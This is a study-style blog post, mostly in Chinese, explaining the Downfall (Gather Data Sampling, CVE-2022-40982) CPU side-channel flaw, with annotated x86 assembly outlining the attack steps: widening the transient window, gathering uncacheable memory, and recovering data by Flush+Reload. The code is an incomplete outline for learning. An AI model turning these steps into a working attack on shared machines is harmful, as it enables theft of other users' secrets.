

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=light>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/DMX.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="DM-X~X~X">
  <meta name="keywords" content="">
  
    <meta name="description" content="downfall   Downfall attacks target a critical weakness found in billions of modern processors used in personal and cloud computers. This vulnerability, identified as CVE-2022-40982, enables a user to">
<meta property="og:type" content="article">
<meta property="og:title" content="downfall">
<meta property="og:url" content="https://dmx20070206.github.io/2024/12/21/downfall/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="downfall   Downfall attacks target a critical weakness found in billions of modern processors used in personal and cloud computers. This vulnerability, identified as CVE-2022-40982, enables a user to">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://dmx20070206.github.io/img/downfall/002.png">
<meta property="og:image" content="https://dmx20070206.github.io/img/downfall/001.png">
<meta property="article:published_time" content="2024-12-20T16:00:00.000Z">
<meta property="article:modified_time" content="2024-12-23T01:16:21.437Z">
<meta property="article:author" content="DM-X~X~X">
<meta property="article:tag" content="Learning">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://dmx20070206.github.io/img/downfall/002.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>downfall - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"dmx20070206.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  



  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>DM-X~X~X</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>About</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>Links</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="downfall"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-12-21 00:00" pubdate>
          December 21, 2024 am
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          1.5k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          13 mins
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> views
        </span>
        

      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">downfall</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="downfall"><a href="#downfall" class="headerlink" title="downfall"></a>downfall</h1><link rel="stylesheet" href="/css/downfall.css">

<blockquote>
<p>Downfall attacks target a critical weakness found in billions of modern processors used in personal and cloud computers. This vulnerability, identified as CVE-2022-40982, enables a user to access and steal data from other users who share the same computer. For instance, a malicious app obtained from an app store could use the Downfall attack to steal sensitive information like passwords, encryption keys, and private data such as banking details, personal emails, and messages. Similarly, in cloud computing environments, a malicious customer could exploit the Downfall vulnerability to steal data and credentials from other customers who share the same cloud computer.</p>
</blockquote>
<img src="/img/downfall/002.png" srcset="/img/loading.gif" lazyload alt="">

<h2 id="Data-Exposure-in-Superscalar-Computers"><a href="#Data-Exposure-in-Superscalar-Computers" class="headerlink" title="Data Exposure in Superscalar Computers"></a>Data Exposure in Superscalar Computers</h2><h3 id="超标量计算机-Superscalar-Computing"><a href="#超标量计算机-Superscalar-Computing" class="headerlink" title="超标量计算机 Superscalar Computing"></a>超标量计算机 Superscalar Computing</h3><h4 id="虚拟地址-Virtual-address-space"><a href="#虚拟地址-Virtual-address-space" class="headerlink" title="虚拟地址 Virtual address space"></a>虚拟地址 Virtual address space</h4><p>CPU 给每个进程提供虚拟地址空间以隔离每个进程占用的内存，程序访问内存的虚拟地址将被转换为页表条目(PTE)。如果虚拟地址超出了程序允许访问的地址区间，将会被阻止。</p>
<h4 id="上下文切换-Context-switching"><a href="#上下文切换-Context-switching" class="headerlink" title="上下文切换 Context switching"></a>上下文切换 Context switching</h4><p>CPU 会出现频繁的进程切换，在上下文切换时，必须切换虚拟地址空间和寄存器上下文，因此新进程将不能访问先前进程的存储器和寄存器。</p>
<h4 id="多线程-Simultaneous-multithreading"><a href="#多线程-Simultaneous-multithreading" class="headerlink" title="多线程 Simultaneous multithreading"></a>多线程 Simultaneous multithreading</h4><p>多线程(SMT)允许多个线程在同一个内核上同时执行，同时共享相同的硬件资源。</p>
<h4 id="预测执行-Speculative-execution"><a href="#预测执行-Speculative-execution" class="headerlink" title="预测执行 Speculative execution"></a>预测执行 Speculative execution</h4><p>当一条指令依赖于先前未解析的操作时，CPU 会根据某种预测推测性地执行该指令。当预测不正确时，CPU 会刷新不正确的执行并重新执行它们以获得正确的结果。预测执行在架构上对软件是不可见的，但它的副作用可以被观察到。</p>
<h4 id="数据化并行-Single-instruction-multiple-data-SIMD"><a href="#数据化并行-Single-instruction-multiple-data-SIMD" class="headerlink" title="数据化并行 Single instruction multiple data (SIMD)"></a>数据化并行 Single instruction multiple data (SIMD)</h4><p>SIMD (Single Instruction, Multiple Data)是一种数据级并行性技术，它允许处理器在同一时刻执行相同的操作，但是作用于不同的数据。</p>
<p>AVX2 和 AVX-512 是 x86 架构中的重要 SIMD 扩展，提供超宽向量寄存器方便大量并行数据计算。</p>
<h4 id="高速缓存-Cache"><a href="#高速缓存-Cache" class="headerlink" title="高速缓存 Cache"></a>高速缓存 Cache</h4><p>如果数据不存在于高速缓存级中(高速缓存未命中)，则从下一级高速缓存或DRAM中提取对应的高速缓存行。</p>
<h4 id="临时缓冲区-Temporal-buffers"><a href="#临时缓冲区-Temporal-buffers" class="headerlink" title="临时缓冲区 Temporal buffers"></a>临时缓冲区 Temporal buffers</h4><p>L1 发生缓存未命中时，正常手续需要从 L2 或更低级存储器中找到对应数据并写入 L1，写入完毕后再从 L1 读取数据。而填充缓冲区允许 CPU 提前获取 缓存行的数据位，而不是等到整个缓存行被加载到 L1 缓存中，CPU 可以将这些数据位快速转发给依赖于这些数据的后续操作(即使整个缓存行还没有完全加载到 L1)。</p>
<p>类似地，当 CPU 执行写操作时，它需要将数据写入内存。如果写入的数据还没有立即提交到缓存中，CPU 会使用一个 存储缓冲区 来临时存储这些数据。</p>
<h4 id="内存类型-Memory-types"><a href="#内存类型-Memory-types" class="headerlink" title="内存类型 Memory types"></a>内存类型 Memory types</h4><p>CPU 支持各种内存类型，以执行缓存策略：回写(WB)、直写(WT)、写保护(WP)、写组合(WC)、不可缓存(UC)。UC 和 WC都是不可缓存的。</p>
<p>UC 是 I&#x2F;O 设备或特殊寄存器的内存地址，防止数据不一致，不写入 Cache<br>WC 是批量写回技术，由于数据量大且短时间不会再用到，不写入 Cache</p>
<h2 id="Gather-Data-Sampling"><a href="#Gather-Data-Sampling" class="headerlink" title="Gather Data Sampling"></a>Gather Data Sampling</h2><h3 id="Gather-Instruction"><a href="#Gather-Instruction" class="headerlink" title="Gather Instruction"></a>Gather Instruction</h3><p>gather 指令可以高效访问<span class="just_red">非连续内存数据</span></p>
<p>访问的所有内存地址来源于 base 寄存器和 index 寄存器，根据 Mask 选取有效的内存数据，拼接到 Result 宽寄存器中</p>
<img src="/img/downfall/001.png" srcset="/img/loading.gif" lazyload alt="" height="550px">

<ul>
    <li>对于掩码为 0 的数据，不进行读取</li>
    <li>读取后会在 cache 中存储一份，方便同一条 gather 指令中的重复读取</li>
    <li>并行、推测地读取全部内存数据，它们必须同时成功或失败</li>
    <li>开辟中间变量保存已经读取的部分，避免中断导致全部重新读取</li>
</ul>

<p>当 gather 指令中间发生中断时，CPU 会利用临时 buffer 存储已经读取的数据(从 DRAM 或 cache 中保存)，方便中断结束后 gather 指令直接从中间重新运行。当 gather 指令错误的结束时，CPU 将抛弃这些值。</p>
<p>gather 指令格式<br><code>vpgatherdd displacement(base, index, scale), dst&#123;mask&#125;</code><br>displacement 是一个偏移量，base 是基址寄存器，index 是索引寄存器，scale 是倍数因子，dst 是写入寄存器，mask 是掩码寄存器。</p>
<h3 id="Exploiting-Gather-Data-Sampling"><a href="#Exploiting-Gather-Data-Sampling" class="headerlink" title="Exploiting Gather Data Sampling"></a>Exploiting Gather Data Sampling</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asm">// Step (i): Increase the transient window<br>lea addresses_normal, %rdi ;                (1) 加载普通地址到 %rdi<br>clflush (%rdi) ;                            (2) 清除缓存中 %rdi 指向的内存<br>mov (%rdi), %rax ;                          (3) 从 %rdi 指向的内存加载数据到 %rax<br><br>// Step (ii): Gather uncacheable memory<br>lea addresses_uncacheable, %rsi ;           (4) 加载不可缓存地址到 %rsi<br>mov \$0b1, %rdi ;                           (5) 设置寄存器值<br>kmovq %rdi, %k1 ;                           (6) 将 %rdi 的值加载到 k1 寄存器<br>vpxord %zmm1, %zmm1, %zmm1 ;                (7) 清零 zmm1 寄存器<br>vpgatherdd 0(%rsi, %zmm1, 1), %zmm5&#123;%k1&#125; ;  (8) 执行 gather 指令并存入 %zmm5<br><br>// Step (iii): Encode (transient) data to cache<br>movq %xmm5, %rax ;                          (9) 将 xmm5 中的数据移动到 %rax<br>encode_eax ;                                (10) 编码数据到缓存<br><br>// Step (iv): Scan the cache<br>scan_flush_reload ;                         (11) 扫描缓存，使用 Flush + Reload 技术<br></code></pre></td></tr></table></figure>

<h4 id="Step-i-Increase-the-transient-window"><a href="#Step-i-Increase-the-transient-window" class="headerlink" title="Step (i): Increase the transient window"></a>Step (i): Increase the transient window</h4><p>Transient window 是 CPU 内部进行的预测性操作的一段时间窗口。在这一段时间内，CPU会执行一些指令，假设这些指令的操作是正确的，即使在实际执行时，可能由于某些分支预测失败或数据依赖错误，这些操作的结果不会最终提交给程序。</p>
<p>在预测执行期间，CPU 执行的指令可能会影响系统状态(如缓存)，而这些影响可能会被利用以获取未授权的数据，即使这些数据最终没有影响程序的最终结果。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">// 清除缓存中 address_normal 指向的内存，保证指令访问该地址时，触发缓存未命中<br>lea addresses_normal, %rdi ;<br>clflush (%rdi) ; <br><br>// 访问地址 address_normal<br>mov (%rdi), %rax ; 从 %rdi 指向的内存加载数据到 %rax<br></code></pre></td></tr></table></figure>

<h4 id="Step-ii-Gather-uncacheable-memory"><a href="#Step-ii-Gather-uncacheable-memory" class="headerlink" title="Step (ii): Gather uncacheable memory"></a>Step (ii): Gather uncacheable memory</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asm">// 目标非法地址 addresses_uncacheable<br>lea addresses_uncacheable, %rsi ;<br><br>// 将 1 加载到掩码寄存器中<br>mov $0b1, %rdi ;<br>kmovq %rdi, %k1 ;<br><br>// 使寄存器 %znm1 置零<br>vpxord %zmm1, %zmm1, %zmm1 ;<br><br>// 访问起始地址为 addresses_uncacheable，掩码为 1<br>vpgatherdd 0(%rsi, %zmm1, 1), %zmm5&#123;%k1&#125; ;<br></code></pre></td></tr></table></figure>

<h4 id="Step-iii-Encode-transient-data-to-cache"><a href="#Step-iii-Encode-transient-data-to-cache" class="headerlink" title="Step (iii): Encode (transient) data to cache"></a>Step (iii): Encode (transient) data to cache</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">// 将 gather 指令的结果加载到 %rax 中并进行编码<br>movq %xmm5, %rax<br>encode_eax<br></code></pre></td></tr></table></figure>

<h4 id="Step-iv-Scan-the-cache"><a href="#Step-iv-Scan-the-cache" class="headerlink" title="Step (iv): Scan the cache"></a>Step (iv): Scan the cache</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">// flush 把特定内存地址的数据从缓存中删除<br>// reload 通过对比加载数据的时间，推测数据是否在缓存当中，进而推测之前指令获取的数据<br>scan_flush_reload<br></code></pre></td></tr></table></figure>

<h4 id="Increase-the-transient-window"><a href="#Increase-the-transient-window" class="headerlink" title="Increase the transient window"></a>Increase the transient window</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asm">// Step 1: Increase the transient window a lot<br>lea addresses_normal_helper, %rdi<br>.set i,0<br>.rept 8<br>clflush 64*i(%rdi)<br>mov 64*i(%rdi), %rax<br>.set i,i+1<br>.endr<br>xchg %rax, 0(%rdi)<br><br>// Step 2: Gather cachable memory (no fault)<br>lea addresses_normal, %rsi<br>...<br></code></pre></td></tr></table></figure>

<p>通过反复访问 cache 中不存在的内存地址数据来扩大 transient window，通过这种操作为 gather 指令的攻击准备好前期条件。</p>
<h4 id="Affected-Instructions"><a href="#Affected-Instructions" class="headerlink" title="Affected Instructions"></a>Affected Instructions</h4><h4 id="Temporal-Buffer-Analysis"><a href="#Temporal-Buffer-Analysis" class="headerlink" title="Temporal Buffer Analysis"></a>Temporal Buffer Analysis</h4>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Learning/" class="print-no-link">#Learning</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>downfall</div>
      <div>https://dmx20070206.github.io/2024/12/21/downfall/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>DM-X~X~X</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>December 21, 2024</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/12/20/DataBase4/" title="数据库八股文——规范化理论">
                        <span class="hidden-mobile">数据库八股文——规范化理论</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"LaZlZczZ7WZl8fj2Kff3EQ6N-MdYXbMMI","appKey":"4rxpDeW2APFf9wOxXFRgXfHD","path":"window.location.pathname","placeholder":"4rxpDeW2APFf9wOxXFRgXfHD","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"https://lazlzczz.api.lncldglobal.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>Table of Contents</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <span> Welcome to DMX blog </span> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
